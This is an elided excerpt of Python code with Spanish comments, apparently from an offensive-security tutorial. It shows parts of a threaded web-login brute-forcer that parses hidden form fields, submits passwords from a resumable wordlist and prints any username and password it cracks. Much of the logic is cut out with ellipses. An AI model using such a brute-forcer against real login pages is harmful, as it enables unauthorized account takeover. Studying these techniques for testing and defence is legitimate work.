...
# configuracion especifica dependiendo del objetivo
...
class Bruter(object):
    ...
    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            ...
            # hacemos parsing en los campos escondidos
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            # añadimos nuestros campos de username y contraseña
            ...
            if success_check in login_result:
                ...
                print("[*] Bruteforce exitoso.")
                print("[*] Usuario: %s" % username)
                print("[*] Contraseña: %s" % brute)
                print("[*] Esperando que los otros threads terminen...")
    ...
    for word in raw_words:
        ...
        if resume is not None:
            if found_resume:
                ...
                if word == resume:
                    found_resume = True
                    print("Continuando wordlist de: %s" % resume)
        else:
            word_queue.put(word)
    return word_queue
